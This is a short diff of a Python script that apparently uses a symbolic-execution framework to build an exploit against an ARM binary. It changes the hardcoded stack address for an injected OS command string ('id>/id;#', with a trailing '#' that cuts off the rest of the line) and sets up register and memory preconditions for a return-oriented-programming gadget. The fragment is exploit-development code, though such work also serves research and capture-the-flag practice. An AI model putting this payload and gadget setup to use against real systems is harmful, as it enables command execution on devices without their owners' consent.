@@ -8,11 +8,10 @@ ctx = ctx
 ast = ast
 
 # OS command
-md5_sum_len = 32
 cmd         = "id>/id;#"
-cmd_addr    = 0xbeffc0c4+396
+cmd_addr    = 0xbeffc250
 
-# Preconditions gadget 0
+# Preconditions
 g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*CPUSIZE.DWORD
 g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*CPUSIZE.DWORD, CPUSIZE.DWORD))
 g0_pc_val  = 0xc9b8
